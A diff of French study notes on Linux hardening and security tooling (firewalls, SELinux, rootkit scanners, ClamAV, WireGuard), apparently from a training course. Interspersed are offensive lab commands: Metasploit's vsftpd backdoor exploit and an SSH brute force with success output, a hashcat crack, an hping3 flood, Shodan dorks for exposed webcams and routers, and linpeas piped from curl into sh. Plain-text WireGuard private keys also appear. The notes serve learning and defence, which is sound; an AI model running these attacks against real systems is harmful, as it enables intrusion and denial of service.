@@ -1,3 +1,12 @@
++-----------------------------------------+
+| Affichage fichier sans ses commentaires |
++-----------------------------------------+
+	$ grep -Ev '^$|^#'
+
++--------------------+
+| Etape 1 de la conf |
++--------------------+
+	blinder le port NTP (123) qui permet à un attaquant de lister les machines connectées sur le réseau
 	Utiliser passwd pour définir un mdp
 
 	nmap cheat sheet : https://www.stationx.net/nmap-cheat-sheet/
@@ -7,33 +16,267 @@
 
 	Sécuriser un linux peut passer par une mise en place de droits 0740 sur /etc/sudoers avec seul l'admin concerné y étant inscrit
 
++-------------------+
+| Gestion du réseau |
++-------------------|
+	SI IFCONFIG OU NETSTAT N'EST PAS INSTALLÉ, NE PAS LES INSTALLER ILS SONT DÉPRÉCIÉS
+	ifconfig = ip
+	netstat = ss
+
++----------+
+| Pare-feu |
++----------+
+	iptables EST le pare-feu
+	ufw est une interface user-friendly pour iptables
+	
+	$ ufw --help
+		Affiche les paramètres de la commande
+	$ ufw enable
+		Le pare-feu est actif et lancé au démarrage du système
+		AUCUNE POLICY PAR DEFAUT : AUTORISE TOUTE CONNEXION
+	$ ufw disable
+		Le pare-feu est arrêté et désactivé lors du démarrage du système
+	$ vim /etc/default/ufw
+		Configuration du pare-feu
+		TOUTE MODIFICATION DEMANDE UN REDÉMARRAGE DU FIREWALL POUR PRISE EN COMPTE
+	$ grep -Ev '^$|^#' /etc/default/ufw
+		Affiche les paramètres. Voici les paramètres par défaut
+		
+		IPV6=yes
+		DEFAULT_INPUT_POLICY="DROP"
+		DEFAULT_OUTPUT_POLICY="ACCEPT"
+		DEFAULT_FORWARD_POLICY="DROP"
+		DEFAULT_APPLICATION_POLICY="SKIP"
+		MANAGE_BUILTINS=no
+		IPT_SYSCTL=/etc/ufw/sysctl.conf
+		IPT_MODULES=""
+	$ ufw allow ssh
+		Autorise le SSH
+	$ ufw status
+		Voici la sortie console après autorisation du SSH (port 22)
+		
+		État : actif
+		Vers                       Action      De
+		----                       ------      --
+		22/tcp                     ALLOW       Anywhere                  
+		22/tcp (v6)                ALLOW       Anywhere (v6) 	
+		
++-------------+
+| SUDO / DOAS |
++-------------+
+	$ visudo
+		Affiche la configuration de sudo
+	$ doas -u root visudo
+		Affiche la configuration de doas
+	Installer doas
+		$ apt install plocate
+		
+		$ apt install doas
+		$ vi 
+
++-----------------------+
+| Définition d'une PSSI |
++-----------------------+
+	Roue de Deming
+	P : Plan : Planifie une nouvelle action
+	D : Do : Réalise l'action
+	C : Check : Contrôle son efficacité
+	A : Action : Réalise son efficacité
+
+Une politique de sécurité du système d'information se décompose en 3 documents distincts :
+- La Politique de Sécurité Informatique
+	doc principal, définit rôles et responsabilités, objectifs et mesures de protection à mettre en place, mesures de sécurité à appliquer pour protéger les systèmes et données. Il n'a que peu de restrictions de sécurité
+- Les Normes de Sécurité Informatique
+	Fournissent des détails spécifiques sur les mesures de sécurité à mettre en place.
+	Peuvent inclure des politiques de gestion de mots de passe, contrôles d'accès, sauvegardes, plans de continuité des activités etc
+- Les Procédures de sécurité informatique
+	Fournissent des instructions détaillées sur les procédures à suivre pour mettre en place les mesures décrites dans les 2 premiers documents
+	- informatique générale
+		politique de base (mots de passen, règles d'accès, sauvegarde, récupération, mesures de sécurité physiques
+	- réseau
+		gestion des réseaux, pare-feux, détection d'intrusion et surveillance des réseaux
+	- applications
+		codage sécurisé, gestion des accès, procédures de test et d'évaluation
+	- données
+		confidentialité, classification des données, stockage et transmission des données, protection de la vie privée
+	- conformité
+		protection des données personnelles, confidentialité des données, transactions électroniques...
+
++------------------------+
+| Application d'une PSSI |
++------------------------+
+	$ vim /etc/login.defs	
+
++---------------------------------------------------------+
+| Mise à jour des firmware des composants de l'ordinateur |
++---------------------------------------------------------+
+	LVFS (Linux Vendor Firmware Service)
+	$ fwupdmgr get-devices
+	$ fwupdmgr get-updates
+	$ fwupdmgr update
+	$ fwupdmgr security --force
+
++---------------------+
+| Choix du bootloader |
++---------------------+
+	Grub embarque un linux complet
+	systemd-boot est beaucoup plus spartiate mais n'embarque pas ce système et est donc plus sécurisé.
+
++---------------------------------------+
+| Check des failles Spectre et Meltdown |
++---------------------------------------+
+	$ spectre-meltdown-checker
+	Désactiver les correctifs demandent de remettre un ancien firmware CPU, c'est une lourde opération
+
++---------------------------------------------------+
+| Paramétrage du kernel 			    |
+| Sélection des modules et paramétrage des tunables |
++---------------------------------------------------+
+	
+- $ vim /boot/config-5.19.0-32-generic pour être BIEN BIEN bourrin
+- On peut utiliser l'utilitaire kconfig-hardened-check
+	https://github.com/a13xp0p0v/kconfig-hardened-check
+	On clone le dépôt et on utilise le script depuis le répertoire
+	$ ./bin/kconfig-hardened-check -c /boot/config-5.1[...(9.0-32-generic)] (on utilise la tabulation pour trouver le fichier de configuration du noyau le plus récent)
+		Permet de checker la configuration du kernel
+- Un outil permet de surveiller dynamiquement le comportement du kernel, il s'agit de LKRG
+(Kernel Runtime Integrity Checking)
+- On peut le configurer sans avoir à le recompiler. Il suffit de mettre un fichier type /etc/modprobe.d/*.conf et d'y mettre les lignes pour interdire les modules à y charger.
+- On peut modifier dans le bootloader des paramètres du kernel
+- On peut modifier le sysctl.conf
+	$ cd /etc/sysctl.d
+	$ ls
+	(identifier la ou les lignes avec sysctl.conf)
+	$ vim 99-sysctl.conf (et eventuellement les autres)
+	On peut y désactiver l'IPv6 par exemple
+
++------+
+| Logs |
++------+
+$ journalctl affiche tous les messages depuis le dernier
+$ journalctl -b affiche depuis le dernier boot
+$ journalctl --list-boots liste les démarrages
+
++---------------+
+| Paquet Debian |
++---------------+
+Il y a 4 fichiers à préparer : preinst, postinst, prerm, postrm pour avant/après install et avant/après suppression. On y place de la création d'utilisateurs ou la liste des dépendances par exemple
+
++------------------+
+| Repository local |
++------------------+
+apt-cacher-ng est un serveur de cache de paquet pour mettre à jour des serveurs sans accès à Internet
+
++---------------------------------------------------------+
+| Vérification de la configuration du fichier /etc/shadow |
++---------------------------------------------------------+
+	$ pwck
+
++-----------+
+| Veracrypt |
++-----------+
+Logiciel de chiffrement de partition
+	https://www.veracrypt.fr/en/Downloads.html
+	$ dpkg -i veracrypt-1.25.9-Ubuntu-22.04-amd64.deb
+
++---------+
+| SELinux |
++---------+
+Implémente le modèle de Controle d'Accès Obligatoire (Mandatory Access Control, MAC)
+	$ selinux-activate
+		Active SELinux que sur un système ne l'ayant pas par défaut. Son activation ne nécessite pas de redémarrage.
+	$ sestatus
+		Donne les informations relatives à SELinux
+	$ getenforce
+		Donne le statut d'activation de SELinux
+	$ setenforce
+		Définit le statut d'activation de SELinux
+
++------------------------------------------------------------+
+| Utilitaire permettant de détecter la présence d'un rootkit |
++------------------------------------------------------------+
+ATTENTION CES UTILITAIRES SE DÉTECTENT ENTRE EUX, DÉSINSTALLER APRÈS USAGE SI MULTIPLES OUTILS
+
+$ apt install chkrootkit
+$ chkrootkit
+http://www.chkrootkit.org/
+
+$ apt install rkhunter
+$ rkhunter -c --rwo
+
++-----------+
+| Antivirus |
++-----------+
+ClamAv
+Il s'installe avec :
+	$ apt install clamav
+Il se vérifie avec :
+	$ clamscan --version
+Il y a un gestionnaire de mise à jour des bases de données virales :
+	$ apt install clamav-cvdupdate
+Il s'utilise avec : 
+	$ cvdupdate serve
+On vérifie le statut de l'antivirus avec :
+	$ systemctl status clamav-freshclam -l
+On alance un scan avec :
+	$ clamscan --infected --remove --recursive /home
+
++-----------+
+| DevSecOps |
++-----------+
+Utilitaire permettant d'identifier des CVE pour telle librairie utilisée dans le dev
+Il est compatible avec différents langages et notamment Maven !
+https://github.com/google/osv-scanner
+https://google.github.io/osv-scanner/
+
+On prend l'exemple du dépôt Git open-source filebrowser
+	$ git clone https://github.com/filebrowser/filebrowser
+
+Osv-Scanner s'installe avec
+	$ apt install golang-go locate (locate pour ce qui va suivre)
+	$ go install github.com/google/osv-scanner/cmd/osv-scanner@v1
+Il va s'installer dans le répertoire personnel de l'utilisateur ayant exécuté la commande
+Pour le trouver :
+	$ updatedb
+	$ locate osv-scanner
+Une fois trouvé, on ouvre son dossier
+	$ cd /root/go/bin/
+Voici la commande à exécuter pour le lancer
+	$ ./osv-scanner -r /home/administrateur/Bureau/filebrowser/
+| OSV URL (ID IN BOLD)                │ ECOSYSTEM │ PACKAGE              │ VERSION │ 
+│ https://osv.dev/GHSA-93q8-gq69-wqmw │ npm       │ ansi-regex           │ 3.0.0   │
+│ https://osv.dev/GHSA-93q8-gq69-wqmw │ npm       │ ansi-regex           │ 4.1.0   │
+│ https://osv.dev/GHSA-93q8-gq69-wqmw │ npm       │ ansi-regex           │ 5.0.0   │
+
+On commence par lire la colonne "PACKAGE", sa "VERSION" est obsolète, cf "OSV URL" cliquable donnant la bonne version à installer.
+
 +------+
 | nmap |
 +------+
 	-v permet plus de clarté
 	-p- permet de taper sur TOUS les ports
 
-nmap -sS 10.20.30.72 -v affiche les 1000 premiers ports les plus utilisés en protocole TCP
+$ nmap -sS 10.20.30.72 -v affiche les 1000 premiers ports les plus utilisés en protocole TCP
 	On peut commencer à attaquer mais avec les conf par défaut, ça revient à tester tout et n'importe quoi
 
-nmap -sS -p- 10.20.30.72 -v
+$ nmap -sS -p- 10.20.30.72 -v
 	Scanne TOUS les ports de la machine en TCP
 	Un malware ouvre très généralement son port au-delà de 10000. Tout port au-delà de 10000 est suspect
 
-nmap -sX 10.20.30.72 -v
-scan Xmas
+$ nmap -sX 10.20.30.72 -v
+$ scan Xmas
 
-nmap -sS -sV 10.20.30.72
+$ nmap -sS -sV 10.20.30.72
 	Fait le scan et affiche la version de certains services qui écoutent le port
 	Il va donc envoyer une requête spécifique pour demander la version du service
 	Si le logiciel n'est pas à jour, une cve et un poc et on entre
 
-nmap -O 10.20.30.72
+$ nmap -O 10.20.30.72
 	Donne l'OS cible
 	Si ça donne VirtualBox au lieu de Linux, il y a des techniques pour aller plus loin
 
 	Commande purement défensive mais TRES bruyante et TRES longue
-nmap -sS -O -sV -T4 -p- -sC --script vuln -v 10.20.30.72
+$ nmap -sS -O -sV -T4 -p- -sC --script vuln -v 10.20.30.72
 	-sS affiche les ports
 	-O l'OS
 	-sV la version des services
@@ -41,11 +284,10 @@ nmap -sS -O -sV -T4 -p- -sC --script vuln -v 10.20.30.72
 	-p- tape partout
 	--script vuln va associer des CVE aux versions issues de -sV
 
-
 +--------+
 | Shodan |
 +--------+
-ping site.com donne l'ip
+$ ping site.com donne l'ip
 https://www.shodan.io/host/42.53.76.31 affiche les infos du serveur derrière l'ip
 webcamxp 5 country:"FR"
 cisco no pass
@@ -54,44 +296,44 @@ hp laserjet port:"8081"
 +----------+
 | USBGuard |
 +----------+
-	Permet de bloquer les ports usb sous linux
-apt install usbguard
-systemctl status usbguard le donne "inactif" après install
-usbguard generate-policy > /etc/usbguard/rules.conf
-systemctl start usbguard
-systemctl enable usbguard
-usbguard list-devices
-usbguard allow-device 5
-usbguard block-device 5
+Permet de bloquer les ports usb sous linux
+	$ apt install usbguard
+	$ systemctl status usbguard le donne "inactif" après install
+	$ usbguard generate-policy > /etc/usbguard/rules.conf
+	$ systemctl start usbguard
+	$ systemctl enable usbguard
+	$ usbguard list-devices
+	$ usbguard allow-device 5
+	$ usbguard block-device 5
 
 +------------+
 | Metasploit |
 +------------+
 	Dans Kali, ouvrir une console avec msfconsole
-search vsftp
-use exploit/unix/ftp/vsftpd_234_backdoor
-show options
-set RHOSTS 10.20.30.72
-run
+	$ search vsftp
+	$ use exploit/unix/ftp/vsftpd_234_backdoor
+	$ show options
+	$ set RHOSTS 10.20.30.72
+	$ run
 	ATTENTION : le $ ou le # n'est pas affiché
 
-use auxiliary/scanner/ssh/sshlogin
-show options
-set pass_file /usr/share/wordlists/metasploit/http_default_pass.txt
-set user_file /usr/share/wordlists/metasploit/http_default_users.txt
-set rhosts 10.20.30.72
-run
+	$ use auxiliary/scanner/ssh/sshlogin
+	$ show options
+	$ set pass_file /usr/share/wordlists/metasploit/http_default_pass.txt
+	$ set user_file /usr/share/wordlists/metasploit/http_default_users.txt
+	$ set rhosts 10.20.30.72
+	$ run
 	Starting bruteforce
 	[+] 10.20.30.72:22 - Success: 'user:user' 'uid=1001(user) gid=1001(user) groups=1001(user)
 	[*] Scanned 1 of 1 hosts (100% complete)
 	[*] Auxiliary module execution completed
-ssh user@10.20.30.72
+	$ ssh user@10.20.30.72
 
 +-----------------+
 | Gestion des mdp |
 +-----------------+
-	passwd [options] [user]
-passwd -m15 -m30 user1 définit une durée minimale de mdp à 15j et maximale à 30j pour user1
+	$ passwd [options] [user]
+	$ passwd -m15 -m30 user1 définit une durée minimale de mdp à 15j et maximale à 30j pour user1
 	+- Vérifier que les mdp dans /etc/passwd et /etc/shadow soient hachés, non en clair
 	+- Vérifier l’activation de l’authentification par mots de passe "shadow"
 	édition du fichier etc/passwd, le 2ème champ doit contenir "x" pour tous les comptes (confirme l’activation de l’authentification par /etc/shadow)
@@ -113,51 +355,51 @@ passwd -m15 -m30 user1 définit une durée minimale de mdp à 15j et maximale à
 +---------+
 | Linpeas |
 +---------+
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
 +------+
 | Hash |
 +------+
-hashcat 7ecc19e1a0be36ba2c6f05d06b5d3058 -m 0 -O /usr/share/wordlists/rockyou.txt
+$ hashcat 7ecc19e1a0be36ba2c6f05d06b5d3058 -m 0 -O /usr/share/wordlists/rockyou.txt
 
 +----------+
 | iptables |
 +----------+
 	+- Pour voir les règles des chaînes de la table FILTER, avec le port concerné
-iptables -L -v
+$ iptables -L -v
 	-A précise la table
 	-p précise le protocole
 	-j précise l'action
-iptables -A INPUT -p tcp -m multiport --dport 22,80,443 -j DROP
-iptables -A OUTPUT -p tcp -m multiport --dport 22,80,443 -j DROP
+$ iptables -A INPUT -p tcp -m multiport --dport 22,80,443 -j DROP
+$ iptables -A OUTPUT -p tcp -m multiport --dport 22,80,443 -j DROP
 	+- blinder le port NTP (123) qui permet à un attaquant de lister les machines connectées sur le réseau
-iptables -A INPUT -p tcp --dport 123 -j DROP
-iptables -A OUTPUT -p tcp --sport 123 -j DROP
+$ iptables -A INPUT -p tcp --dport 123 -j DROP
+$ iptables -A OUTPUT -p tcp --sport 123 -j DROP
 	+- Pour créer une chaîne "SSH" qui contient toutes les règles SSH
-iptables -N SSH
-iptables -A INPUT -j SSH
+$ iptables -N SSH
+$ iptables -A INPUT -j SSH
 	+- Pour vérifier l'action
-nmap -Pn 10.20.30.72
+$ nmap -Pn 10.20.30.72
 	+-  Pour voir les ports filtrés distants
-nmap -sA 10.20.30.72
+$ nmap -sA 10.20.30.72
 	+- limiter le SSH à une seule IP connue
-iptables -A SSH -p tcp -s 10.20.30.72 -j ACCEPT
+$ iptables -A SSH -p tcp -s 10.20.30.72 -j ACCEPT
 	+- limiter tous les protocoles à cette IP
-iptables -A SSH -p all -s 10.20.30.72 -j ACCEPT
+$ iptables -A SSH -p all -s 10.20.30.72 -j ACCEPT
 	Pour loguer les connections entrantes
-iptables -P INPUT DROP
-iptables -A INPUT -j LOG --log-prefix 'connection dropped :'
+$ iptables -P INPUT DROP
+$ iptables -A INPUT -j LOG --log-prefix 'connection dropped :'
 	Les logs sont dans /var/log/messages
-tail -f /var/log/messages pour voir en temps réel le fichier
+$ tail -f /var/log/messages pour voir en temps réel le fichier
 	+- Limiter le flooding ICMP
-iptables -a INPUT -p icmp -m limit --limit 1/s --limit-burst 1 -j ACCEPT
+$ iptables -a INPUT -p icmp -m limit --limit 1/s --limit-burst 1 -j ACCEPT
 	+- loguer ce qui passe mais surtout pas ce qui a été refusé pour éviter une surcharge des logs en cas de flooding
-iptables -a INPUT -p icmp -m limit --limit 1/s --limit-burst 1 -j LOG --log-prefix 'ICMP 1/s accepté :'
+$ iptables -a INPUT -p icmp -m limit --limit 1/s --limit-burst 1 -j LOG --log-prefix 'ICMP 1/s accepté :'
 	+- générer du flooding icmp
-hping3 -1 --flood 10.20.30.72
+$ hping3 -1 --flood 10.20.30.72
 	+- sauvegarde et restauration iptables
-iptables-save > default-iptables.txt
-iptables-restore < default-iptables.txt
+$ iptables-save > default-iptables.txt
+$ iptables-restore < default-iptables.txt
 
 +----------------------+
 | Scripts au démarrage |
@@ -192,4 +434,74 @@ Le sensor a un 2eme adapter réseau, réseau privé hôte toujours, promiscuité
 séparer les ip mais les placer dans le créneau du réseau hôte, voir dans le "gestionnaire de réseau hôte de VirtualBox"
 Il permet de déployer HIDS sur des serveurs, une fois fait il donne un dashboard où il affiche des alertes
 Nikto, fourni, permet de scanner les potentielles vulnérabilités d'un service Web
+
++----------------------+
+| Liste des CVE propre |
++----------------------+
+https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=vim
+
+------------------------------------------------------------------------+
+| OpenCTI, partager la connaissance cyber avec les autres organisations |
+------------------------------------------------------------------------+
+https://github.com/OpenCTI-Platform/opencti
+
++---------------------+
+| Daemons et serveurs |
++---------------------+
+Un daemon est un service qui tourne en arrière-plan de manière autonome sans intervention de l'utilisateur 
+Un serveur écoute un port réseau et réagit en fonction des requêtes
+
++-----------------------+
+| Installation d'un VPN |
++-----------------------+
+
+Installation des packets côté clients :
+	$ apt install wireguard
+Installation des packets côté serveur CentOS/Rocky :
+	$ yum update
+	$ yum install elrepo-release epel-release
+	$ yum install wireguard-tools
+Pour les clients et serveur :
+	$ cd /etc/wireguard
+	$ wg genkey | tee privatekey | wg pubkey > publickey
+	$ chmod go= /etc/wireguard/p*
+Configuration côté clients :
+	$ vim /etc/sysctl.d/wg.conf
+		Créer le fichier et ajouter la ligne
+		net.ipv4.ip_forward=1
+	$ sysctl -p /etc/sysctl.d/wg.conf
+		Applique les modifications dans le kernel
+	$ vim /etc/wireguard/wg.conf
+		[Interface]
+		Address = 192.168.10.12/24
+		ListenPort = 51820
+
+		PrivateKey = EGNzjR0JXoYX8pmdBKIB1OCnnZY5Aac8LzcauSMe+0s=
+
+		[Peer]
+		EndPoint = 192.168.10.11:51820
+		PublicKey = /4wCK66Xoe4RQUAA2c+kjYr5QnYthGvteYQBWENOuTA=
+		AllowedIPs = 192.168.10.0/24, 10.0.10.0/24
+Configuration côté serveur :
+	$ vim /etc/wireguard/wg.conf
+		[Interface]
+		Address = 192.168.10.11/24
+		ListenPort = 51820
+
+		PrivateKey = eJgjBwmb1wRe8aDCPRPf6sB2b9l9LyjqmZnuBXDGO2c=
+
+		[Peer]
+		PublicKey = llgRMNIu1n18mBvx8sPYy7+FK6ddhdCn7uqfj3Hajlg=
+		AllowedIPs = 192.168.10.12/32
+Démarrage du VPN pour les clients et serveur :
+	$ wg-quick up wg
+		(wg est le nom du fichier .conf)
+Vérification de la configuration côté client :
+	$ wg
+	$ ping 192.168.10.12
+Vérification de la configuration côté serveur :
+	$ wg
+	$ ping 192.168.10.11
+Automatisation du démarrage côté serveur
+	$ systemctl enable wg-quick@wg
 
